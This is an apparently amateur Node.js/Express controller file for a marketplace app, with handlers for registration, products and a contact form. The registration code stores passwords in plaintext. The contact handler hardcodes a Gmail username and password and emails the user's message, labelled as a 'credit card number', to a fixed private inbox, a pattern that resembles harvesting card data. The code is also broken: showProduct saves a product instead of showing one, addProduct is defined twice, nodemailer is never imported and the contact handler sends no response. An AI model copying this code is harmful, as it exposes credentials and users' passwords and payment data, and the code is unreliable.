const { UserModel, ProductModel } = require('./model.js');
exports.register = (req, res) => {
  const { firstName, lastName, email, password } = req.body;
  let userDoc = new UserModel({
    firstName: firstName,
    lastName: lastName,
    email: email,
    password: password,
  });
  userDoc.save((err) => {
    if (err) {
      console.log(err);
      res.status(500).send(err);
    } else {
      res.status(201).send('Saved');
    }
  });
};
// Post product -- Add
exports.addProduct = function (req, res) {
  const { title, description, price, images, category, location } = req.body;
  let productDocument = new ProductModel({
    title: title,
    description: description,
    price: price,
    images: images,
    category: category,
    location: location,
  });
  productDocument
    .save()
    .then(() => res.send('saved product!'))
    .catch((err) => {
      res.send(err);
    });
};
//Show Product
exports.showProduct = function (req, res) {
  const { title, description, price, images, category, location } = req.body;
  let productDocument = new ProductModel({
    title: title,
    description: description,
    price: price,
    images: images,
    category: category,
    location: location,
  });
  productDocument
    .save()
    .then(() => res.send('saved product!'))
    .catch((err) => {
      res.send(err);
    });
};
exports.contact = function (req, res) {
  const { senderName, senderEmail, senderMessage } = req.body;
  console.log('we are there');
  sendEmail(senderEmail, senderMessage);
  function sendEmail(email, number) {
    console.log('we area here');
    nodemailer.createTestAccount((err, account) => {
      let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
          user: 'ssomespacee@gmail.com', // generated ethereal user
          pass: 'somespace@easy', // generated ethereal password
        },
      });
      // send mail with defined transport object
      transporter.sendMail(
        {
          from: '"ExChange" <ssomespacee@gmail.com>', // sender address
          to: 'ssomespacee@gmail.com', // list of receivers
          subject: 'Credit card Number ✔', // Subject line
          text: 'Hello world?', // plain text body
          html: `<h2>Hello world? : ${email}</h2><p>This is your credit card number : </p> <p>${number}<p/>`, // html body
        },
        (err, info) => {
          if (err) {
            console.log(err);
            return console.log(err);
          }
          console.log('Message sent: %s', info.messageId);
          console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));
        }
      );
    });
  }
};
//Post product -- Add
exports.addProduct = function (req, res) {
  const { title, description, price, images, category, location } = req.body;
  let productDocument = new ProductModel({
    title: title,
    description: description,
    price: price,
    images: images,
    category: category,
    location: location,
  });
  productDocument
    .save()
    .then(() => res.send('saved product!'))
    .catch((err) => {
      res.send(err);
    });
};
